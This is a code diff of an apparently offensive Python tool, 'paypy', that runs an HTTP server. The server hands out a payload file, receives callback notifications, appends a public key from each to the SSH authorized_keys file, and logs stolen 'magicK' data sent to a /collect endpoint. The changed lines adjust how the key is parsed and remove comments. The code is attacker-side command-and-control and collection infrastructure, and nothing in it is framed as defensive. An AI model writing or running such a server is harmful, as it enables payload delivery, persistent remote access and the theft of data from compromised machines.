@@ -29,7 +29,7 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n{post_data.decode()}\n')
 			try:
 				post_json = json.loads(post_data.decode())
-				public_key = post_json.get("PublicKey", "")	
+				public_key = post_json.get("PublicKey", {}).get("value", "")
 				if public_key:
 					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
 					with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as auth_keys:
@@ -39,6 +39,7 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No public key found in POST data\n')
 			except json.JSONDecodeError:
 				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
+
 		elif self.path == '/collect':
 			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
 		else:
@@ -54,12 +55,10 @@ def get_local_ip():
 	s.close()
 	return local_ip
 
-# warn
 if len(argv) != 3:
 	print('usage: paypy <port> </payload/path>')
 	exit(1)
 
-# run server
 port = int(argv[1])
 file_path = argv[2]
 DownloadHandler.base_path = file_path
